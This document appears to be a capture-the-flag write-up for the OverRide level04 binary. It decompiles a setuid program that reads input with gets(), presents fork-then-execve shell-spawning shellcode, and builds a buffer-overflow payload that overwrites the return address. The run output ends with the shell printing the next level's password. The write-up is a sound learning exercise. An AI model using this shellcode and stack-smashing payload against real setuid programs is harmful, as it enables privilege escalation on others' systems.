@@ -1,0 +1,116 @@
+
+```bash
+level04@OverRide:~$ ls -l
+total 8
+-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04
+level04@OverRide:~$ file level04 
+level04: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x7386c3c1bbd3e4d8fc85f88744379783bf327fd7, not stripped
+```
+
+Reversed in c:
+```c
+int main(int argc, const char **argv, const char **envp)
+{
+  int stat_loc; // [esp+1Ch] [ebp-9Ch] BYREF
+  char str[128]; // [esp+20h] [ebp-98h] BYREF
+  int v6; // [esp+A0h] [ebp-18h]
+  int v7; // [esp+A4h] [ebp-14h]
+  int v8; // [esp+A8h] [ebp-10h]
+  __pid_t pid; // [esp+ACh] [ebp-Ch]
+
+  pid = fork();
+  memset(str, 0, sizeof(str));
+  v8 = 0;
+  stat_loc = 0;
+  if (pid != 0)
+  {
+    // Parent
+    do
+    {
+      wait(&stat_loc);
+      v6 = stat_loc;
+      if ( (stat_loc & 0x7F) == 0 || (v7 = stat_loc, (char)((stat_loc & 0x7F) + 1) >> 1 > 0) )
+      {
+        puts("child is exiting...");
+        return 0;
+      }
+      v8 = ptrace(PTRACE_PEEKUSER, pid, 44, 0);
+    }
+    while ( v8 != 11 );
+    puts("no exec() for you");
+    kill(pid, 9);
+  }
+  else
+  {
+    prctl(1, 1);
+    ptrace(PTRACE_TRACEME, 0, 0, 0);
+    puts("Give me some shellcode, k");
+    gets(str);
+  }
+  return 0;
+}
+```
+
+Here the parent check if start a execve with `ptrace()` call.
+We can just `fork()` at the begining of the shellcode so create a new process that will run the shellcode when the other got stop by the parent
+
+First we can write our shellcode:
+0:  b8 02 00 00 00          mov    eax,0x2
+5:  cd 80                   int    0x80
+7:  31 c0                   xor    eax,eax
+9:  31 d2                   xor    edx,edx
+b:  50                      push   eax
+c:  68 2f 2f 73 68          push   0x68732f2f
+11: 68 2f 62 69 6e          push   0x6e69622f
+16: 89 e3                   mov    ebx,esp
+18: 50                      push   eax
+19: 53                      push   ebx
+1a: 89 e1                   mov    ecx,esp
+1c: b0 0b                   mov    al,0xb
+1e: cd 80                   int    0x80 
+"\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80"
+
+
+And we find where we are in the stack:
+```bash
+(gdb) x/4x $ebp
+0xffffd708:	0x00000000	0xf7e45513	0x00000001	0xffffd7a4
+
+[  char str[128]; // [esp+20h] [ebp-98h] BYREF](source.c)
+
+esp            0xffffd650	0xffffd650
+ebp            0xffffd708	0xffffd708
+
+(gdb) x/48x $esp
+0xffffd650:	0x00000001	0x00000001	0x00000000	0xf7e2fe44
+0xffffd660:	0x00000b80	0x00000000	0xf7fdc714	0x00000000
+0xffffd670:	0x080482e0	0x0804a010	0x000001a4	0xf7fd32e8 # start of str
+0xffffd680:	0xf7fd3000	0xf7e356e4	0xf7e39194	0x08048210
+0xffffd690:	0x00000001	0x08049ff4	0x00000000	0x00000001
+0xffffd6a0:	0xffffd6d8	0xf7ff0a50	0x00000000	0xffffd6d8
+0xffffd6b0:	0x08049ff4	0x00000000	0xf7ee3ee2	0x080486c6
+0xffffd6c0:	0x0000003c	0x0804868f	0x00000001	0x08048485
+0xffffd6d0:	0xf7fcf3e4	0x00000016	0x00000001	0x08048882
+0xffffd6e0:	0x00000001	0xffffd7a4	0xffffd7ac	0xf7e5ede5
+0xffffd6f0:	0xf7feb620	0x00000000	0x08048839	0xf7fceff4
+0xffffd700:	0xf7fceff4	0x00000000	0x00000000	0xf7e45513
+```
+
+And overwrite the main return address to point to our shellcode
+```bash
+rm -f /tmp/level04
+printf '\x90%.0s' {1..100} > /tmp/level04
+echo -ne "\xB8\x02\x00\x00\x00\xCD\x80\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80" >> /tmp/level04
+printf 'A%.0s' {1..24} >> /tmp/level04
+echo -ne "\xca\xd6\xff\xff" >> /tmp/level04 # 0xff ff d6 ca
+```
+
+We run it:
+```bash
+level04@OverRide:~$ cat /tmp/level04 - | ./level04 
+Give me some shellcode, k
+
+no exec() for you
+cat /home/users/level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+```
